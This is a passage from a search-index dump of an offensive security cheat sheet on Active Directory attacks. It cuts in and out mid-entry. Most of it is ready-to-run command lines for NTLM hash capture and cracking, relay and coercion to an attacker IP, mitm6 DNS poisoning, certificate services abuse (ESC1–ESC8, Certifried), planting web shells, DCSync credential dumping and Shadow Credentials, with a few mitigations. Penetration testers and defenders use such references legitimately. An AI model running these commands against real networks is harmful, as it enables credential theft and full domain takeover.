NTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972 * Or crack them with Hashcat / John The Ripper ps1 john --format=netntlm hash.txt hashcat -m 5500 -a 3 hash.txt * Now you can DCSync using the Pass-The-Hash with the DC machine account :warning: NTLMv1 with SSP(Security Support Provider) changes the server challenge and is not quite ideal for the attack, but it can be used. Mitigations : Set the Lan Manager authentication level to Send NTLMv2 responses only. Refuse LM & NTLM","title":"Capturing and cracking Net-NTLMv1/NTLMv1 hashes"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#capturing-and-cracking-net-ntlmv2ntlmv2-hashes","text":"If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison LLMNR , MDNS and NETBIOS requests on the network. # https://github.com/lgandx/Responder $ sudo ./Responder.py -I eth0 -wfrd -P -v # https://github.com/Kevin-Robertson/InveighZero PS > .\\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N] # https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1 PS > Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y \u2013mDNS Y \u2013Proxy Y -MachineAccounts Y Crack the hashes with Hashcat / John The Ripper john --format=netntlmv2 hash.txt hashcat -m 5600 -a 3 hash.txt","title":"Capturing and cracking Net-NTLMv2/NTLMv2 hashes"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#man-in-the-middle-attacks-relaying","text":"NTLMv1 and NTLMv2 can be relayed to connect to another machine. Hash Hashcat Attack method LM 3000 crack/pass the hash NTLM/NTHash 1000 crack/pass the hash NTLMv1/Net-NTLMv1 5500 crack/relay attack NTLMv2/Net-NTLMv2 5600 crack/relay attack Crack the hash with hashcat . hashcat -m 5600 -a 0 hash.txt crackstation.txt","title":"Man-in-the-Middle attacks &amp; relaying"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#ms08-068-ntlm-reflection","text":"NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to Windows Server 2008. This vulnerability allows an attacker to redirect an incoming SMB connection back to the machine it came from and then access the victim machine using the victim\u2019s own credentials. https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068 msf > use exploit/windows/smb/smb_relay msf exploit(smb_relay) > show targets","title":"MS08-068 NTLM reflection"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#smb-signing-disabled-and-ipv4","text":"If a machine has SMB signing : disabled , it is possible to use Responder with Multirelay.py script to perform an NTLMv2 hashes relay and get a shell access on the machine. Also called LLMNR/NBNS Poisoning Open the Responder.conf file and set the value of SMB and HTTP to Off . powershell [Responder Core] ; Servers to start ... SMB = Off # Turn this off HTTP = Off # Turn this off Run python RunFinger.py -i IP_Range to detect machine with SMB signing : disabled . Run python Responder.py -I <interface_card> Use a relay tool such as ntlmrelayx or MultiRelay impacket-ntlmrelayx -tf targets.txt to dump the SAM database of the targets in the list. python MultiRelay.py -t <target_machine_IP> -u ALL ntlmrelayx can also act as a SOCK proxy with every compromised sessions. ```powershell $ impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support [*] Servers started, waiting for connections Type help for list of commands ntlmrelayx> socks Protocol Target Username Port -------- -------------- ------------------------ ---- MSSQL 192.168.48.230 VULNERABLE/ADMINISTRATOR 1433 SMB 192.168.48.230 CONTOSO/NORMALUSER1 445 MSSQL 192.168.48.230 CONTOSO/NORMALUSER1 1433","title":"SMB Signing Disabled and IPv4"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#you-might-need-to-select-a-target-with-t","text":"impacket-ntlmrelayx -t mssql://10.10.10.10 -socks -smb2support impacket-ntlmrelayx -t smb://10.10.10.10 -socks -smb2support","title":"You might need to select a target with \"-t\""},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#the-socks-proxy-can-then-be-used-with-your-impacket-tools-or-crackmapexec","text":"$ proxychains impacket-smbclient //192.168.48.230/Users -U contoso/normaluser1 $ proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth $ proxychains crackmapexec mssql 10.10.10.10 -u user -p '' -d DOMAIN -q \"SELECT 1\" ``` Mitigations : Disable LLMNR via group policy powershell Open gpedit.msc and navigate to Computer Configuration > Administrative Templates > Network > DNS Client > Turn off multicast name resolution and set to Enabled Disable NBT-NS powershell This can be achieved by navigating through the GUI to Network card > Properties > IPv4 > Advanced > WINS and then under \"NetBIOS setting\" select Disable NetBIOS over TCP/IP","title":"the socks proxy can then be used with your Impacket tools or CrackMapExec"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#smb-signing-disabled-and-ipv6","text":"Since MS16-077 the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS. crackmapexec smb $hosts --gen-relay-list relay.txt # DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6 # -d is the domain name that we filter our request on - the attacked domain # -i is the interface we have mitm6 listen on for events mitm6 -i eth0 -d $domain # spoofing WPAD and relaying NTLM credentials impacket-ntlmrelayx -6 -wh $attacker_ip -of loot -tf relay.txt impacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug # -ip is the interface you want the relay to run on # -wh is for WPAD host, specifying your wpad file to serve # -t is the target where you want to relay to. impacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2","title":"SMB Signing Disabled and IPv6"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#drop-the-mic","text":"The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP Check vulnerability with cve-2019-1040-scanner python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET' [*] CVE-2019-1040 scanner by @_dirkjan / Fox-IT - Based on impacket by SecureAuth [*] Target TARGET is not vulnerable to CVE-2019-1040 (authentication was rejected) Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD powershell TERM1> python printerbug.py testsegment.local/username@s2012exc.testsegment.local <attacker ip/hostname> TERM2> ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support TERM1> secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server. ```powershell # create a new machine account TERM1> ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support TERM2> python printerbug.py relaytest.local/username@second-dc-server 10.0.2.6 TERM1> getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD' -impersonate DOMAIN_ADMIN_USER_NAME","title":"Drop the MIC"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#connect-using-the-ticket","text":"export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache secretsdump.py -k -no-pass second-dc-server.local -just-dc ```","title":"connect using the ticket"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#ghost-potato-cve-2019-1384","text":"Requirements: * User must be a member of the local Administrators group * User must be a member of the Backup Operators group * Token must be elevated Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impacket-ghostpotato.zip ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe","title":"Ghost Potato - CVE-2019-1384"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#remotepotato0-dcom-dce-rpc-relay","text":"It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine Requirements: - a shell in session 0 (e.g. WinRm shell or SSH shell) - a privileged user is logged on in the session 1 (e.g. a Domain Admin user) # https://github.com/antonioCoco/RemotePotato0/ Terminal> sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 & # Can be omitted for Windows Server <= 2016 Terminal> sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1 Session0> RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2 Terminal> psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'","title":"RemotePotato0 DCOM DCE RPC relay"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dns-poisonning-relay-delegation-with-mitm6","text":"Requirements: - IPv6 enabled (Windows prefers IPV6 over IPv4) - LDAP over TLS (LDAPS) ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account's name and password and modifies the delegation rights of it. git clone https://github.com/fox-it/mitm6.git cd /opt/tools/mitm6 pip install . mitm6 -hw ws02 -d lab.local --ignore-nofqnd # -d: the domain name that we filter our request on (the attacked domain) # -i: the interface we have mitm6 listen on for events # -hw: host whitelist ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad --add-computer # -ip: the interface you want the relay to run on # -wh: WPAD host, specifying your wpad file to serve # -t: the target where you want to relay to # now granting delegation rights and then do a RBCD ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad getST.py -spn cifs/target.lab.local lab.local/GENERATED\\$ -impersonate Administrator export KRB5CCNAME=administrator.ccache secretsdump.py -k -no-pass target.lab.local","title":"DNS Poisonning - Relay delegation with mitm6"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#relaying-with-webdav-trick","text":"Example of exploitation where you can coerce machine accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access. It allows attackers to elicit authentications made over HTTP instead of SMB Requirement : * WebClient service Exploitation : * Disable HTTP in Responder: sudo vi /usr/share/responder/Responder.conf * Generate a Windows machine name: sudo responder -I eth0 , e.g: WIN-UBNW4FI3AP0 * Prepare for RBCD against the DC: python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support * Discover WebDAV services ps1 webclientservicescanner 'domain.local'/'user':'password'@'machine' crackmapexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav GetWebDAVStatus.exe 'machine' * Trigger the authentication to relay to our nltmrelayx: PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4 , the listener host must be specified with the FQDN or full netbios name like logger.domain.local@80/test.txt . Specifying the IP results in anonymous auth instead of System. ```ps1 # PrinterBug dementor.py -d \"DOMAIN\" -u \"USER\" -p \"PASSWORD\" \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\" SpoolSample.exe \"ATTACKER_IP\" \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" # PetitPotam Petitpotam.py \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\" Petitpotam.py -d \"DOMAIN\" -u \"USER\" -p \"PASSWORD\" \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\" PetitPotam.exe \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\" * Use the created account to ask for a service ticket: ps1 .\\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W' .\\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt ls \\PC1.purple.lab\\c$ # IP of PC1: 10.0.0.4 ```","title":"Relaying with WebDav Trick"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#active-directory-certificate-services","text":"Find ADCS Server crackmapexec ldap domain.lab -u username -p password -M adcs ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b \"CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local\" dNSHostName Enumerate AD Enterprise CAs with certutil: certutil.exe -config - -ping","title":"Active Directory Certificate Services"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#esc1-misconfigured-certificate-templates","text":"Domain Users can enroll in the VulnTemplate template, which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). Allows additional identities to be bound to a certificate beyond the Subject. Requirements: * Template that allows for AD authentication * ENROLLEE_SUPPLIES_SUBJECT flag * [PKINIT] Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage) Exploitation: * Use Certify.exe to see if there are any vulnerable templates ps1 Certify.exe find /vulnerable Certify.exe find /vulnerable /currentuser # or PS> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local' # or certipy 'domain.local'/'user':'password'@'domaincontroller' find -bloodhound * Use Certify, Certi or Certipy to request a Certificate and add an alternative name (user to impersonate) ps1 # request certificates for the machine account by executing Certify with the \"/machine\" argument from an elevated command prompt. Certify.exe request /ca:dc.domain.local\\domain-DC-CA /template:VulnTemplate /altname:domadmin certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local' * Use OpenSSL and convert the certificate, do not enter a password ps1 openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx * Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using Rubeus ps1 Rubeus.exe asktgt /user:domadmin /certificate:C:\\Temp\\cert.pfx WARNING : These certificates will still be usable even if the user or computer resets their password! NOTE : Look for EDITF_ATTRIBUTESUBJECTALTNAME2 , CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT , ManageCA flags, and NTLM Relay to AD CS HTTP Endpoints.","title":"ESC1 - Misconfigured Certificate Templates"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#esc2-misconfigured-certificate-templates","text":"Requirements: * Allows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0) Exploitation: * Find template ps1 PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local' * Request a certificate specifying the /altname as a domain admin like in ESC1 .","title":"ESC2 - Misconfigured Certificate Templates"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#esc3-misconfigured-enrollment-agent-templates","text":"ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users Request a certificate based on the vulnerable certificate template ESC3. ps1 $ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3' [*] Saved certificate and private key to 'john.pfx' Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user ps1 $ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\\administrator' -pfx 'john.pfx'","title":"ESC3 - Misconfigured Enrollment Agent Templates"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#esc4-access-control-vulnerabilities","text":"Enabling the mspki-certificate-name-flag flag for a template that allows for domain authentication, allow attackers to \"push a misconfiguration to a template leading to ESC1 vulnerability Search for WriteProperty with value 00000000-0000-0000-0000-000000000000 using modifyCertTemplate ps1 python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -get-acl Add the ENROLLEE_SUPPLIES_SUBJECT (ESS) flag to perform ESC1 ```ps1 python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag # Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template. C:>StandIn.exe --adcs --filter WebServer --ess --add * Perform ESC1 and then restore the value ps1 python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag ``` Using Certipy # overwrite the configuration to make it vulnerable to ESC1 certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -save-old # request a certificate based on the ESC4 template, just like ESC1. certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local' # restore the old configuration certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json","title":"ESC4 - Access Control Vulnerabilities"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#esc6-editf_attributesubjectaltname2","text":"If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name. Exploitation: * Use Certify.exe to check for UserSpecifiedSAN flag state which refers to the EDITF_ATTRIBUTESUBJECTALTNAME2 flag. ps1 Certify.exe cas * Request a certificate for a template and add an altname, even though the default User template doesn't normally allow to specify alternative names ps1 .\\Certify.exe request /ca:dc.domain.local\\domain-DC-CA /template:User /altname:DomAdmin Mitigation: * Remove the flag : certutil.exe -config \"CA01.domain.local\\CA01\" -setreg \"policy\\EditFlags\" -EDITF_ATTRIBUTESUBJECTALTNAME2","title":"ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#esc7-vulnerable-certificate-authority-access-control","text":"Exploitation: * Detect CAs that allow low privileged users the ManageCA or Manage Certificates permissions ps1 Certify.exe find /vulnerable * Change the CA settings to enable the SAN extension for all the templates under the vulnerable CA (ESC6) ps1 Certify.exe setconfig /enablesan /restart * Request the certificate with the desired SAN. ps1 Certify.exe request /template:User /altname:super.adm * Grant approval if required or disable the approval requirement ps1 # Grant Certify.exe issue /id:[REQUEST ID] # Disable Certify.exe setconfig /removeapproval /restart Alternative exploitation from ManageCA to RCE on ADCS server: # Get the current CDP list. Useful to find remote writable shares: Certify.exe writefile /ca:SERVER\\ca-name /readonly # Write an aspx shell to a local web directory: Certify.exe writefile /ca:SERVER\\ca-name /path:C:\\Windows\\SystemData\\CES\\CA-Name\\shell.aspx /input:C:\\Local\\Path\\shell.aspx # Write the default asp shell to a local web directory: Certify.exe writefile /ca:SERVER\\ca-name /path:c:\\inetpub\\wwwroot\\shell.asp # Write a php shell to a remote web directory: Certify.exe writefile /ca:SERVER\\ca-name /path:\\\\remote.server\\share\\shell.php /input:C:\\Local\\path\\shell.php","title":"ESC7 - Vulnerable Certificate Authority Access Control"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#esc8-ad-cs-relay-attack","text":"An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller\u2019s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket. Require Impacket PR #1101 Version 1 : NTLM Relay + Rubeus + PetitPotam ```powershell impacket> python3 ntlmrelayx.py -t http:// /certsrv/certfnsh.asp -smb2support --adcs impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate # For a member server or workstation, the template would be \"Computer\". # Other templates: workstation, DomainController, Machine, KerberosAuthentication # Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam # You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN git clone https://github.com/topotam/PetitPotam python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP python3 dementor.py -u -p -d python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local # Use the certificate with rubeus to request a TGT Rubeus.exe asktgt /user: /certificate: /ptt Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt # Now you can use the TGT to perform a DCSync mimikatz> lsadump::dcsync /user:krbtgt ``` Version 2 : NTLM Relay + Mimikatz + Kekeo ```powershell impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController # Mimikatz mimikatz> misc::efs /server:dc.lab.local /connect: /noauth # Kekeo kekeo> base64 /input:on kekeo> tgt::ask /pfx: /user:dc$ /domain:lab.local /ptt # Mimikatz mimikatz> lsadump::dcsync /user:krbtgt ``` Version 3 : Kerberos Relay ```ps1 # Setup the relay sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine # Run mitm6 sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v ``` Version 4 : ADCSPwn - Require WebClient service running on the domain controller. By default this service is not installed. ```powershell https://github.com/bats3c/ADCSPwn adcspwn.exe --adcs --port [local port] --remote [computer] adcspwn.exe --adcs cs.pwnlab.local adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001 adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\\Temp\\cert_b64.txt adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\\mranderson --password The0nly0ne! --dc dc.pwnlab.local # ADCSPwn arguments adcs - This is the address of the AD CS server which authentication will be relayed to. secure - Use HTTPS with the certificate service. port - The port ADCSPwn will listen on. remote - Remote machine to trigger authentication from. username - Username for non-domain context. password - Password for non-domain context. dc - Domain controller to query for Certificate Templates (LDAP). unc - Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) . output - Output path to store base64 generated crt. ``` Version 5 : Certipy ESC8 ps1 certipy relay -ca 172.16.19.100","title":"ESC8 - AD CS Relay Attack"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#certifried-cve-2022-26923","text":"An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege. Find ms-DS-MachineAccountQuota ps1 python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes 'DC=lab,DC=local' ms-DS-MachineAccountQuota Add a new computer in the Active Directory, by default MachineAccountQuota = 10 ps1 python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 addComputer cve 'CVEPassword1234*' certipy account create 'lab.local/username:Password123*@dc.lab.local' -user 'cve' -dns 'dc.lab.local' [ALTERNATIVE] If you are SYSTEM and the MachineAccountQuota=0 : Use a ticket for the current machine and reset its SPN ps1 Rubeus.exe tgtdeleg export KRB5CCNAME=/tmp/ws02.ccache python bloodyAD -d lab.local -u 'ws02$' -k --host dc.lab.local setAttribute 'CN=ws02,CN=Computers,DC=lab,DC=local' servicePrincipalName '[]' Set the dNSHostName attribute to match the Domain Controller hostname ps1 python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 setAttribute 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName '[\"DC.lab.local\"]' python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName Request a ticket ps1 # certipy req 'domain.local/cve$:CVEPassword1234*@ADCS_IP' -template Machine -dc-ip DC_IP -ca discovered-CA certipy req 'lab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA Either use the pfx or set a RBCD on your machine account to takeover the domain ```ps1 certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10 openssl pkcs12 -in dc.pfx -out dc.pem -nodes python bloodyAD.py -d lab.local -c \":dc.pem\" -u 'cve$' --host 10.10.10.10 setRbcd 'CVE$' 'CRASHDC$' getST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip 10.10.10.10 'lab.local/cve$:CVEPassword1234*' secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'lab.local/Administrator@dc.lab.local' -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 ```","title":"Certifried CVE-2022-26923"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#pass-the-certificate","text":"Pass the Certificate in order to get a TGT, this technique is used in \"UnPAC the Hash\" and \"Shadow Credential\" Windows ```ps1 # Information about a cert file certutil -v -dump admin.pfx # From a Base64 PFX Rubeus.exe asktgt /user:\"TARGET_SAMNAME\" /certificate:cert.pfx /password:\"CERTIFICATE_PASSWORD\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /show # Grant DCSync rights to an user ./PassTheCert.exe --server dc.domain.local --cert-path C:\\cert.pfx --elevate --target \"DC=domain,DC=local\" --sid # To restore ./PassTheCert.exe --server dc.domain.local --cert-path C:\\cert.pfx --elevate --target \"DC=domain,DC=local\" --restore restoration_file.txt * Linux ps1 # Base64-encoded PFX certificate (string) (password can be set) gettgtpkinit.py -pfx-base64 $(cat \"PATH_TO_B64_PFX_CERT\") \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\" \u200b # PEM certificate (file) + PEM private key (file) gettgtpkinit.py -cert-pem \"PATH_TO_PEM_CERT\" -key-pem \"PATH_TO_PEM_KEY\" \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\" # PFX certificate (file) + password (string, optionnal) gettgtpkinit.py -cert-pfx \"PATH_TO_PFX_CERT\" -pfx-pass \"CERT_PASSWORD\" \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\" # Using Certipy certipy auth -pfx \"PATH_TO_PFX_CERT\" -dc-ip 'dc-ip' -username 'user' -domain 'domain' certipy cert -export -pfx \"PATH_TO_PFX_CERT\" -password \"CERT_PASSWORD\" -out \"unprotected.pfx\" ```","title":"Pass-The-Certificate"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#unpac-the-hash","text":"Using the UnPAC The Hash method, you can retrieve the NT Hash for an User via its certificate. Windows ps1 # Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC. Rubeus.exe asktgt /getcredentials /user:\"TARGET_SAMNAME\" /certificate:\"BASE64_CERTIFICATE\" /password:\"CERTIFICATE_PASSWORD\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /show Linux ```ps1 # Obtain a TGT by validating a PKINIT pre-authentication $ gettgtpkinit.py -cert-pfx \"PATH_TO_CERTIFICATE\" -pfx-pass \"CERTIFICATE_PASSWORD\" \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\"","title":"UnPAC The Hash"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#use-the-session-key-to-recover-the-nt-hash","text":"$ export KRB5CCNAME=\"TGT_CCACHE_FILE\" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME' ```","title":"Use the session key to recover the NT hash"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#shadow-credentials","text":"Add Key Credentials to the attribute msDS-KeyCredentialLink of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user. When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match. :warning: User objects can't edit their own msDS-KeyCredentialLink attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists Requirements : * Domain Controller on (at least) Windows Server 2016 * Domain must have Active Directory Certificate Services and Certificate Authority configured * PKINIT Kerberos authentication * An account with the delegated rights to write to the msDS-KeyCredentialLink attribute of the target object Exploitation : - From Windows, use Whisker : powershell # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object. Whisker.exe list /target:computername$ # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device. Whisker.exe add /target:\"TARGET_SAMNAME\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /path:\"cert.pfx\" /password:\"pfx-password\" Whisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\\path\\to\\file.pfx /password:P@ssword1] # Removes a key credential from the target object specified by a DeviceID GUID. Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b From Linux, use pyWhisker : bash # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object. python3 pywhisker.py -d \"domain.local\" -u \"user1\" -p \"complexpassword\" --target \"user2\" --action \"list\" # 